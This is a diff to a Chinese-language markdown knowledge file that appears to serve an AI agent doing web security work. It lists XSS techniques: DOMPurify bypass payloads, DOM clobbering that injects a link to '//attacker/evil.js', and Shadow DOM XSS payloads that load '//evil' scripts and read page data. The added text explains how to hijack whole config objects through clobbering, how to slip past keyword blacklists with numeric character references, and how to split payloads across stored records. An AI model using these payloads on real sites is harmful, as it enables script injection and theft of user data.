@@ -92,7 +92,7 @@ DOMPurify 绕过三模式：
 2. `<noscript>` 解析差异：`<noscript><style></noscript><img src=x onerror=alert(1)>`（scripting 启用/禁用视角不同）
 3. form/table 重构：`<form><math><mtext></form><form><mglyph><svg><mpath><set attributeName=onmouseover to=alert(1)>`（树构建器自动重构）
 
-**DOM Clobbering**：`<img id=x>` → `window.x` 是该元素；`<form id=x><img id=y>` → `window.x.y`；双 `<a id=x>` → HTMLCollection；3 级 `<form id=x name=y><input id=z>` → `document.x.y.z`。利用：`if(window.config){url=window.config.url}` 时注入 `<a id=config href="//attacker/evil.js">`；`String(window.x)`===href。`cid:` 协议部分净化器放行。`typeof x!=='undefined'` 防御可被绕过（DOM 元素也是对象）。
+**DOM Clobbering**：`<img id=x>` → `window.x` 是该元素；`<form id=x><img id=y>` → `window.x.y`；双 `<a id=x>` → HTMLCollection；3 级 `<form id=x name=y><input id=z>` → `document.x.y.z`。利用：`if(window.config){url=window.config.url}` 时注入 `<a id=config href="//attacker/evil.js">`；`String(window.x)`===href。`cid:` 协议部分净化器放行。`typeof x!=='undefined'` 防御可被绕过（DOM 元素也是对象）。**多字段配置对象整体替换**：N 个同 id 的 `<a name=字段名 href=值>`，`window.<id>` 为 HTMLCollection，其命名属性即 `config.panel`/`config.next` 等逐字段可读——脚本按属性名取配置时被整体劫持，无需任何 JS 执行; id/name/href 中的黑名单词用无分号数字引用（`m&#111de`）在浏览器侧复活（构造法见 `$AGENT_DIR/knowledge-base/html-parse-differentials.md` §2.5）; 单字段长度受限时跨多条存储记录分片拼装（各片段渲染后共同落在同一页面节点集内即可）。
 
 **Shadow DOM XSS**: ① closed shadow root 劫持——Proxy 包裹 `Element.prototype.attachShadow` 捕获 root 引用; ② 间接 eval `(0,eval)('code')` 逃逸 with(document) scope; ③ payload 走私进固定前缀字段（avatar URL）+ `avatar.slice(N)` 提取: `<svg/onload=(0,eval)('eval(avatar.slice(24))')>`; ④ 关键字过滤常漏 `</script>` 结构标签——闭合现有脚本上下文后 `<script src=//evil>` 外载，从 `document.scripts[].textContent` 读页面数据。
 
